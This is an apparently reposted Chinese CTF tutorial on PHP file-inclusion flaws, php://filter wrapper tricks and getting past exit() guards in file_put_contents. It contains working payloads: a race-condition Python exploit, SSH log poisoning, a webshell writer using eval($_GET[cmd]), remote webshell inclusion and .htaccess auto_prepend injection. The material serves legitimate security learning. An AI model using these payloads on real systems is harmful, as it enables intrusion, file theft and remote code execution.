> 原文链接: https://www.anquanke.com//post/id/231407 


# 从浅入深学习PHP文件包含


                                阅读量   
                                **209965**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t0115156126d71d26a9.jpg)](https://p5.ssl.qhimg.com/t0115156126d71d26a9.jpg)



在刚接触这方面的时候就先了解过PHP文件包含，但是通过做题还是觉得之前学的不是很扎实，这次将之前不理解的有疑问的还有学到的一并总结起来。

## 文件包含

> 服务器在执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这样会节省开发时间

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"></a>漏洞产生原因

> 通过引入文件时，用户可控，没有严格的检验，或是被绕过，操作一些敏感文件，导致文件泄露和恶意代码注入

例如：

```
&lt;?php
    $filename  = $_GET['filename'];
    include($filename);
?&gt;
```

`$_GET['filename']`没有经过严格的过滤，直接带入了include的函数，便可以修改`$_GET['filename']`的值，执行非预期的操作。

在PHP中，通常是以下四个包含函数：

```
include()
include_once()
require()
require_once()
```

include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。

[![](https://p0.ssl.qhimg.com/t0117e1f9e67d7b40aa.png)](https://p0.ssl.qhimg.com/t0117e1f9e67d7b40aa.png)

include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。

[![](https://p0.ssl.qhimg.com/t0157d00de74d37767e.png)](https://p0.ssl.qhimg.com/t0157d00de74d37767e.png)



## 两种文件包含

> 当包含文件在服务器本地上，就形成本地文件包含，当包含的文件在第三方服务器是，就形成可远程文件包含。

### <a class="reference-link" name="%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"></a>本地文件包含

**<a class="reference-link" name="0x00:%E6%97%A0%E4%BB%BB%E4%BD%95%E9%99%90%E5%88%B6"></a>0x00:无任何限制**

测试代码如下:

```
&lt;?php
if(isset($_GET['file']))`{`
    $file = $_GET['file'];
    include($file);
`}`else`{`
    highlight_file(__FILE__);
`}`
?&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015abf2d6134be0e20.png)

由于没有任何限制所以可以通过目录遍历漏洞来获取到系统中的其他内容，因为考察文件包含经常是结合任意文件读取漏洞的，所以就总结一些文件常见读取路径

```
/etc/apache2/*
#Apache配置文件，可以获知Web目录、服务端口等信息
/etc/nginx/*
#Nginx配置文件，可以获知Web目录、服务端口等信息
/etc/crontab
#定时任务文件
/etc/environment
#环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况
/etc/hostname
#主机名
/etc/hosts
#主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，可以探测网卡信息和内网IP/域名
/etc/issue
#系统版本信息
/etc/mysql/*
#MYSQL配置文件
/etc/php/*
#PHP配置文件
/proc 目录
#/proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录，如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需/proc/self代替/proc/[pid]即可
/proc/[pid]/cmdline
#cmdline可读出比较敏感的信息
# ssh日志，攻击方法：
ssh `&lt;?php phpinfo(); ?&gt;`@192.168.1.1
/var/log/auth.log
# apache日志
/var/log/apache2/[access.log|error.log]

```

上面的示例代码是没有任何限制的，如果有限制的本地文件包含要怎么绕过那？

**<a class="reference-link" name="0x01:%E9%99%90%E5%88%B6%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E5%90%8E%E7%BC%80%E5%90%8D"></a>0x01:限制包含文件的后缀名**

例如如下代码，增加了杂糅代码，对文件读取产生影响，但还是可以绕过

```
&lt;?php
if(isset($_GET['file']))`{`
    $file = $_GET['file'];
    include($file . ".Sn0w");
`}`else`{`
    highlight_file(__FILE__);
`}`
?&gt;
```

**<a class="reference-link" name="%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%9A%00%E6%88%AA%E6%96%AD"></a>第一种方法：%00截断**

> <p>前提：PHP&lt;5.3.4<br>
magic_quotes_gpc = Off</p>

```
http://127.0.0.1/LFI/?file=flag.txt%00
```

**<a class="reference-link" name="%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%9A%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"></a>第二种方法：长度截断**

> <p>前提：PHP版本&lt;=5.2.?<br>
操作系统对于目录字符串存在长度限制<br>
Windows下目录最大长度为256字节，超出的部分会被丢弃掉<br>
Linux下目录最大长度为4096字节，超出的部分会被丢弃掉</p>

如：windows操作系统，`.`超过256个字节即可

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01397a78bfa3482217.png)

Linux下只需不断重复`./`即可

**<a class="reference-link" name="%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%9Azip/phar%E5%8D%8F%E8%AE%AE"></a>第三种方法：zip/phar协议**

测试代码：

```
&lt;?php
if(isset($_GET['file']))`{`
    $file = $_GET['file'];
    include($file . ".php");
`}`else`{`
    highlight_file(__FILE__);
`}`
?&gt;
```

```
zip://文件路径/zip文件名称#压缩包内的文件名称 （使用时注意将#号进行URL编码）
phar://文件路径/phar文件名称/phar内的文件名称
phar://协议与zip://类似，同样可以访问zip格式压缩包内容

```

[![](https://p3.ssl.qhimg.com/t01edc5558c8e607363.png)](https://p3.ssl.qhimg.com/t01edc5558c8e607363.png)

**<a class="reference-link" name="0x02:Session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"></a>0x02:Session文件包含漏洞**

> 前提条件：PHP版本&gt;5.4.0、配置项：session.upload_progress.enabled的值为On

示例代码如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ae3ee4413417a53a.png)

利用session.upload_progress进行文件包含,在php5.4之后添加了这个功能

[![](https://p1.ssl.qhimg.com/t01dff49f04582a065f.png)](https://p1.ssl.qhimg.com/t01dff49f04582a065f.png)

再来看几个php.ini的**默认选项**：

```
session.upload_progress.enabled = on
表示upload_progress功能开始，即当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中
session.upload_progress.cleanup = on
表示当文件上传结束后，php将会立即清空对应session文件中的内容
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
#表示为session中的键名
session.use_strict_mode=off
#表示对Cookie中sessionid可控
```

上面几个默认选项，可能最后两个稍微有点不好理解，其实官方已经举出了对应的例子，如：

```
// PHPSESSION = Sn0w
&lt;form action="upload.php" method="POST" enctype="multipart/form-data"&gt;
 &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt;
 &lt;input type="file" name="file1" /&gt;
 &lt;input type="file" name="file2" /&gt;
 &lt;input type="submit" /&gt;
&lt;/form&gt;
```

在`session.upload_``progress.name='PHP_SESSION_UPLOAD_PROGRESS'`的条件下,上传文件，便会在`session['upload_progress_123']`中储存一些本次上传相关的信息,储存在`/tmp/sess_Sn0w`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b8c17231f79f04ae.png)

通过上图和几个默认选项的有关介绍就想是否可以利用session.upload_progress来写入恶意语句，然后进行包含文件，但前提是需要知道session的存储位置

这就需要先了解一下PHP中session的存储机制

> php中的session中的内容并不是存储在内存中，而是以文件的方式进行存储，存储方式是由配置项session.save_handler来进行确定的,默认便是以文件的方式进行存储，存储文件的名字便是由sess_sessionid来进行命名的，文件的内容便是session值序列化之后的内容。至于存储路径便是由配置项session.save_path来进行决定的。

一般session的存储路径都不会怎么去改，默认的便是：

```
linux:
/tmp
或
/var/lib/php/session
Windows:
C:\WINDOWS\Temp
```

存储路径知道了，但是还是有一个问题，便是代码中没有session_start()函数，怎么样创建出session文件那，其实如果配置项`session.auto_start=On` 是打开的，那么PHP在接收请求的时候便会自动化Session，不再需要执行该函数，但默认都是关闭的，在session中还有一个默认选项，便是上面提到的`session.use_strict_mode`默认值是0，用户可以自己定义SessionID。如：

```
Cookie中设置:
PHPSESSID=Sn0w
PHP便会在服务器上创建一个文件(默认路径)
/tmp/sess_Sn0w
```

即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有`ini.get("session.upload_progress.prefix")`+由我们构造的`session.upload_progress.name`值组成，最后被写入sess_文件里。

但还有一个问题没有解决，即使是写进去了默认配置`session.upload_progress.cleanup = on`导致文件上传后，session文件内容会立即被清空，所以这里就需要去使用多线程同时进行写和读，进行条件竞争，在session文件清除前进行包含利用。

```
# -*- coding: utf-8 -*-
import requests
import io
import threading

url = 'http://40902305-6448-4874-b65d-79adb550fd6d.chall.ctf.show/'
sessID = 'Sn0w'

def write(session):
    #判断event的标志是否为True
    while event.isSet():
        #上传文件要大一点,更有利于条件竞争
        f = io.BytesIO(b'Sn0w' * 1024 * 50)
        reponse = session.post(
            url,
            cookies=`{`'PHPSESSID': sessID`}`,
            data=`{`'PHP_SESSION_UPLOAD_PROGRESS':'&lt;?php system("cat *.php");?&gt;'`}`,
            files=`{`'file':('text.txt',f)`}`
        )
def read(session):
    while event.isSet():
        reponse = session.get(url+ '?file=/tmp/sess_`{``}`'.format(sessID))
        if 'text' in reponse.text:
            print(reponse.text)
            #将event的标志设置为False，调用wait方法的所有线程将被阻塞；
            event.clear()
        else:
            print('[*]continued')

if __name__ == '__main__':
    #通过threading.Event()可以创建一个事件管理标志，该标志（event）默认为False
    event = threading.Event()
    #将event的标志设置为True，调用wait方法的所有线程将被唤醒；
    event.set()
    #会话机制(Session）在PHP 中用于保持用户连续访问Web应用时的相关数据
    with requests.session() as session:
        for i in range(1,30):
            threading.Thread(target=write, args=(session,)).start()
        for i in range(1,30):
            threading.Thread(target=read, args=(session,)).start()
```

上传的有关信息

[![](https://p4.ssl.qhimg.com/t0113b9c83fae95318b.png)](https://p4.ssl.qhimg.com/t0113b9c83fae95318b.png)

自己设置的键值因为是php所以解析掉了

[![](https://p1.ssl.qhimg.com/t0171e5005d3d8ba2bc.png)](https://p1.ssl.qhimg.com/t0171e5005d3d8ba2bc.png)

这样就可以得到flag了,除此之外，还可以使用burp来进行条件竞争，例如上面官方给的html上传代码上传一个文件

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
&lt;form action="http://5303095a-4023-42e2-b099-30486f1b3323.chall.ctf.show/" method="POST" enctype="multipart/form-data"&gt;
&lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123456" /&gt;
&lt;input type="file" name="file" /&gt;
&lt;input type="submit" value="submit" /&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c4e64d6318dcf622.png)

再根据代码抓一个get的包，请求/tmp/sess_flag

[![](https://p0.ssl.qhimg.com/t012b6c7118a3fea0cc.png)](https://p0.ssl.qhimg.com/t012b6c7118a3fea0cc.png)

同时进行爆破，payload设置成null payloads就可以一直爆破

[![](https://p4.ssl.qhimg.com/t0116449e8ee9722405.png)](https://p4.ssl.qhimg.com/t0116449e8ee9722405.png)

### <a class="reference-link" name="%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"></a>远程文件包含

> <p>利用前提：<br>
allow_url_fopen = On 是否允许打开远程文件<br>
allow_url_include = On 是否允许include/require远程文件</p>

**<a class="reference-link" name="0x00:%E6%97%A0%E4%BB%BB%E4%BD%95%E9%99%90%E5%88%B6"></a>0x00:无任何限制**

代码没有任何限制，直接在公网上存放恶意webshell即可，然后通过包含即可执行恶意payload

```
?filename=http://xxxx/php.txt
```

**<a class="reference-link" name="0x01:%E9%99%90%E5%88%B6%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E5%90%8E%E7%BC%80%E5%90%8D"></a>0x01:限制包含文件的后缀名**

例如：

```
&lt;?php include($_GET['filename'] . ".no"); ?&gt;
```

**<a class="reference-link" name="%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%9A?%E7%BB%95%E8%BF%87"></a>第一种方法：?绕过**

```
?filename=http://xxxx/php.txt?
```

**<a class="reference-link" name="%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%9A#%E7%BB%95%E8%BF%87"></a>第二种方法：#绕过**

```
?filename=http://xxxx/php.txt%23
```



## PHP伪协议

> 简单理解便是PHP自己提供的一套协议，可以适用于自己的语言，其他语言则不适用，这便是伪协议，与之相对的例如HTTP\HTTPS便不是伪协议，因为大部分系统\软件都能够进行识别。

### <a class="reference-link" name="%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE"></a>常见的伪协议

[![](https://p1.ssl.qhimg.com/t014d77b230173d195b.png)](https://p1.ssl.qhimg.com/t014d77b230173d195b.png)

如果遇到的环境有写入权限，可以使用php://input伪协议来写入木马

```
POST DATA
&lt;?php fputs(fopen('Sn0w.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;
```

### <a class="reference-link" name="php://filter%E5%90%84%E7%A7%8D%E8%BF%87%E6%BB%A4%E5%99%A8"></a>**php://filter各种过滤器**

> php://filter是一种元封装器，设计用来数据流打开时筛选过滤应用。<br>[官方文档](https://www.php.net/manual/zh/wrappers.php.php)

对于php://来说，是支持多种过滤器嵌套的，格式如下：

```
php://filter/[read|write]=[过滤器1]|[过滤器2]/resource=文件名称（包含后缀名）
#如果|被过滤掉了，可以使用多过滤器:
php://filter/string.rot13/resource=php://filter/convert.base64-encode/resource=文件名称（包含后缀名）
嵌套过程的执行流程为从左到右
```

其实是可以简写成这样的`php://filter/[过滤器]` ，php会自己进行识别。

[![](https://p1.ssl.qhimg.com/t0158ac01d2e5584381.png)](https://p1.ssl.qhimg.com/t0158ac01d2e5584381.png)

过滤器列表如下：

<th style="text-align: center;">过滤器名称</th><th style="text-align: center;">说明</th><th style="text-align: center;">类别</th><th style="text-align: center;">版本</th>
|------
<td style="text-align: center;">string.rot13</td><td style="text-align: center;">rot13转换</td><td style="text-align: center;">字符串过滤器</td><td style="text-align: center;">PHP&gt;4.3.0</td>
<td style="text-align: center;">string.toupper、string.tolower</td><td style="text-align: center;">大小写互转</td><td style="text-align: center;">字符串过滤器</td><td style="text-align: center;">PHP&gt;5.0.0</td>
<td style="text-align: center;">string.strip_tags</td><td style="text-align: center;">去除`&lt;?(.*?)?&gt;`的内容</td><td style="text-align: center;">string.strip_tags</td><td style="text-align: center;">PHP&lt;7.3.0</td>
<td style="text-align: center;">convert.base64-encode、convert.base64-decode</td><td style="text-align: center;">base64编码转换</td><td style="text-align: center;">转换过滤器</td><td style="text-align: center;">PHP&gt;5.0.0</td>
<td style="text-align: center;">convert.quoted-printable-encode、convert.quoted-printable-decode</td><td style="text-align: center;">URL编码转换</td><td style="text-align: center;">转换过滤器</td><td style="text-align: center;">PHP&gt;5.0.0</td>
<td style="text-align: center;">convert.iconv.编码1.编码2</td><td style="text-align: center;">任意编码转换</td><td style="text-align: center;">转换过滤器</td><td style="text-align: center;">PHP&gt;5.0.0</td>
<td style="text-align: center;">zlib.deflate、zlib.inflate</td><td style="text-align: center;">zlib压缩</td><td style="text-align: center;">压缩过滤器</td><td style="text-align: center;">PHP&gt;5.1.0</td>
<td style="text-align: center;">bzip2.compress、bzip2.decompress</td><td style="text-align: center;">zlib压缩</td><td style="text-align: center;">压缩过滤器</td><td style="text-align: center;">PHP&gt;5.1.0</td>

从上面的过滤器列表中便会发现，php伪协议主要支持以下几类：
1. 字符串过滤器
1. string.strip_tags
1. 转换过滤器
1. 压缩过滤器
1. 加密过滤器
### <a class="reference-link" name="PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"></a>PHP伪协议常用函数
- file_get_contents
- file_put_contents
- readfile
- fopen
- file
- show_source
<li>highlight_file<br><blockquote>注意show_source有回显，而file_get_contents是没有回显的</blockquote>
</li>


## file_put_content与死亡/杂糅代码

CTF经常类似考察这样的代码：

```
file_put_contents($filename,"&lt;?php exit();".$content);

file_put_contents($content,"&lt;?php exit();".$content);

file_put_contents($filename,$content . "\nxxxxxx");
```

这种代码非常常见，在$content开头增加了exit进程，即使写入一句话，也无法执行，遇到这种问题一般的解决方法便是利用伪协议`php://filter`,结合编码或相应的过滤器进行绕过。绕过原理便是将死亡或者杂糅代码分解成为php无法进行识别的代码。

### <a class="reference-link" name="%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5"></a>第一种情况

这里自己先搭建一个环境，通过学习大师傅绕过的方法，自己也来实践一番

```
&lt;?php
if(isset($_GET['file']))`{`
    $file = $_GET['file'];
    $content = $_POST['content'];
    file_put_contents($file,"&lt;?php exit();".$content);
`}`else`{`
    highlight_file(__FILE__);
`}`
```

**<a class="reference-link" name="0x01:base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"></a>0x01:base64编码绕过**

上面提到了绕过原理便是将死亡或者杂糅代码分解成为php无法进行识别的代码。<br>
对于第一种情况便可以使用base64编码，因为base64只能打印64（a-z0-9A-Z）个可打印字符，PHP在解码base64时，如果遇到了不在其中的字符，便会跳过这些字符，然后将合法字符组成一个新的字符串再进行解码。当$content被加上了`&lt;?php exit; ?&gt;`以后，可以使用 `php://filter/convert.base64-decode`来首先对其解码。在解码的过程中，字符`&lt;、?、;、&gt;、空格`等不符合base64编码的字符范围将会被忽略，所以最终被解码的字符只有`phpexit`和传入的其他字符。

但是还要知道一点的是base64解码时是4个byte一组,上面正常解码的只有7个字符，所以再手动加上去1个字符a，凑齐8个字符即可

**payload：**

```
?file=php://filter/convert.base64-decode/resource=Sn0w.php
DATA:
content=aPD9waHAgcGhwaW5mbygpOz8+
```

[![](https://p4.ssl.qhimg.com/t019c32304fa87b8c79.png)](https://p4.ssl.qhimg.com/t019c32304fa87b8c79.png)

**<a class="reference-link" name="0x02:rot13%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"></a>0x02:rot13编码绕过**

利用rot13编码其实和base64编码绕过原理一样，只要成为php无法进行识别的代码，就不会执行。

> 前提是PHP没有开启short_open_tag(短标签)，默认情况下是没有开启的

**payload:**

```
&lt;?php phpinfo();?&gt;
rot13
&lt;?cuc cucvasb();?&gt;
```

[![](https://p5.ssl.qhimg.com/t01a51a90c19be08679.png)](https://p5.ssl.qhimg.com/t01a51a90c19be08679.png)

**<a class="reference-link" name="0x03:%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87"></a>0x03:嵌套绕过**

> strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签（php7.3之后移除）

除了上面的两种编码绕过，还可以使用嵌套过滤器的方式来进行绕过，在上面的过滤器列表中有一个`string.strip_tags`，可以去除剥去字符串中的 HTML、XML 以及 PHP 的标签，而`&lt;?php exit; ?&gt;`实际上便是一个XML标签，既然是XML标签，就可以利用strip_tags函数去除它，所以可以先将webshell用base64编码。调用完成strip_tags后再进行base64-decode。`死亡exit`在第一步被去除，而webshell在第二步被还原。

**payload：**

```
#php5
?file=php://filter/string.strip_tags|convert.base64-decode/resource=Sn0w.php
DATA:
content=?&gt;PD9waHAgcGhwaW5mbygpOz8+
#由于&lt;?php exit();不是完整的标签，所以需要加上?&gt;进行补全
```

[![](https://p0.ssl.qhimg.com/t01056f36fe92423326.png)](https://p0.ssl.qhimg.com/t01056f36fe92423326.png)

但是这种方法有局限性，因为string.strip_tags在php7以上的环境下会发生段错误，从而导致无法写入，在php5的环境下则不受此影响。

那如果环境是php7的话，也可以使用过滤器嵌套的方法来做，流程是先将三个过滤器叠加之后进行压缩，然后转小写，最后再解压，这样的流程执行结束后会导致部分死亡代码错误，便可以写进去我们想要写入的shell，原理很简单，就是利用过滤器嵌套的方式让死亡代码在各种变换之间进行分解扰乱，最终变成php无法识别的字符。

```
?file=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=4.php
DATA:
content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=4.php
或者
content=php/:|&lt;?php%0Dphpinfo();?&gt;/resource=4.php
```

[![](https://p1.ssl.qhimg.com/t0184cb9068a6b54def.png)](https://p1.ssl.qhimg.com/t0184cb9068a6b54def.png)

经过测试发现这里最好文件名尽量不要太复制，可能会导致写不进去

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01583c2d118942225f.png)

**<a class="reference-link" name="0x04:.htaccess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"></a>0x04:.htaccess的预包含利用**

> .htaccess是一个纯文本文件，里面存放着Apache服务器配置相关的一些指令，它类似于Apache的站点配置文件,但只作用于当前目录，而且是只有用户访问目录时才加载，通过该文件可以实现网页301重定向，自定义404错误页面，改变文件拓展名，禁止目录列表等

通过 `php_value` 来设置 `auto_prepend_file`或者 `auto_append_file` 配置选项包含一些敏感文件, 同时在本目录或子目录中需要有可解析的 `php` 文件来触发。

```
php_value auto_prepend_file +文件绝对路径（默认为当前上传的目录）
```

**payload:**

```
?file=php://filter/write=string.strip_tags/resource=.htaccess
DATA:
content=?&gt;php_value%20auto_prepend_file%20D:\flag.php
```

[![](https://p3.ssl.qhimg.com/t015e6100cb7a6b25b2.png)](https://p3.ssl.qhimg.com/t015e6100cb7a6b25b2.png)

这时无论访问那个文件，都会解析出flag.php

### <a class="reference-link" name="%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%83%85%E5%86%B5"></a>第二种情况

```
&lt;?php
if(isset($_GET['content']))`{`
    $content = $_GET['content'];
    file_put_contents($content,"&lt;?php exit();".$content);
`}`else`{`
    highlight_file(__FILE__);
`}`
```

这种情况和上面第一种便有点不同了，因为是一个变量，但还是可以利用php伪协议进行嵌套过滤器来消除死亡代码的，看了s1mple师傅的方法，还是可以利用.htaccess进行预包含，然后读取flag。

**<a class="reference-link" name="0x01:.htaccess%E9%A2%84%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87"></a>0x01:.htaccess预包含绕过**

**payload:**

```
?content=php://filter/string.strip_tags/?&gt;php_value auto_prepend_file D:\flag.php%0a%23/resource=.htaccess
```

[![](https://p0.ssl.qhimg.com/t01de1225902e584951.png)](https://p0.ssl.qhimg.com/t01de1225902e584951.png)

可以直接自定义预包含文件，这里直接包含了.htaccess导致了所有文件都包含flag.php文件

**<a class="reference-link" name="0x02:base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"></a>0x02:base64编码绕过**

既然变成了一个变量，那么首先想到的payload便是：

```
php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=Sn0w.php
```

但是有一个问题，可以创建文件，但是无法写入内容，查看了cyc1e师傅的博客，发现问题是出在=号上，因为默认情况下base64编码是以`=`作为结尾的，在正常解码的时候到了 `=`就解码结束了，在最后获取文件名的时候因为resource=中含有等号，所以以为解码是结束了，导致过滤器解码失败，从而报错，内容由于解码过程出错了，所以就都丢弃了。

所以现在问题就转变为了只要能去掉这个等号，就可以将内容写进去，可以看下这种方法：

```
php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php
```

如果按照之前的思路是先闭合死亡代码，然后再使用过滤器去除html标签，最后再进行解码，但仔细观察这个payload并非是那种解法，而是直接在内容时，就将我们base64遇到的等号这个问题直接写在`&lt;? ?&gt;`中进行过滤掉，然后base64-decode再对原本内容的`&lt;?php exit();`进行转码，从而达到分解死亡代码的目的。

除此之外还可以使用之前的思路来做，既然base64编码写在里面不行，那么就直接放在外面，然后搭配一下过滤器

```
php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php
```

先闭合死亡代码，然后进行解码，这样便可以写入到文件中去，但访问的话会出现问题，查看s1mple师傅的方法，发现可以通过使用伪目录的方法，从而绕过去

```
php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../Sn0w.php
```

将前面的一串base64字符和闭合的符号整体看作一个目录，虽然没有，但是后面重新撤回了原目录，生成Sn0w.php文件；从而就可以生成正常的文件名，上面的那种方法也可以使用这种伪目录的方法解决访问问题。

**<a class="reference-link" name="0x02:rot13%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"></a>0x02:rot13编码绕过**

rot13则无需考虑=号问题

```
?content=php://filter/string.rot13/&lt;?cuc cucvasb();?&gt;/resource=1.php
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0101c0286575eb66ad.png)

**<a class="reference-link" name="0x03:iconv%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"></a>0x03:iconv字符编码绕过**

> 在php中iconv函数库能够完成各种字符集间的转换

在该函数库下有一个`convert.iconv.`这样的过滤器，这个过滤器需要 php 支持 `iconv`，而 iconv 是默认编译的。使用`convert.iconv.*`过滤器等同于用`iconv()`函数处理所有的流数据。

> <p>**iconv** ( string `$in_charset` , string `$out_charset` , string `$str` ) : string<br>
将字符串 str 从 in_charset 转换编码到 out_charset。</p>

那接下来的思路就很明显了，就是借用此过滤器，从而进行编码的转换，转换掉死亡代码，写入自己的shell，首先先要了解一下UCS的两种编码格式

```
UCS有两种格式
UCS-2和UCS-4
UCS-2就是用两个字节编码
UCS-4就是用四个字节编码
```

先来看一下利用这个函数即不同的格式转换后的结果

[![](https://p0.ssl.qhimg.com/t01d764b66a26333374.png)](https://p0.ssl.qhimg.com/t01d764b66a26333374.png)

第二个之所以要加上两个字符，是因为UCS-4对目标字符串是4位一反转，所以要注意这里的恶意代码要是4的倍数，所以这里需要补上两个字符

那接下来就用过滤器将这些编码后的结果再转回去不就形成了我们想要写入的内容

**<a class="reference-link" name="UCS-2"></a>UCS-2**

> 对目标字符串进行2位一反转

**payload：**

```
php://filter//convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=2.php
```

[![](https://p1.ssl.qhimg.com/t019c2bfa24ba2c3683.png)](https://p1.ssl.qhimg.com/t019c2bfa24ba2c3683.png)

**<a class="reference-link" name="UCS-4"></a>UCS-4**

> 对目标字符串进行4位一反转，一定要拼凑够4的倍数

```
php://filter/convert.iconv.UCS-4LE.UCS-4BE|?&lt;aa phpiphp(ofn&gt;?;)/resource=3.php
```

[![](https://p3.ssl.qhimg.com/t01d0db579efefdd09d.png)](https://p3.ssl.qhimg.com/t01d0db579efefdd09d.png)

**<a class="reference-link" name="0x04:%E7%BB%84%E5%90%88%E6%8B%B3"></a>0x04:组合拳**

**<a class="reference-link" name="UTF-8/UTF-7"></a>UTF-8/UTF-7**

还记得上面的base64编码之所以这种

```
php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=Sn0w.php
```

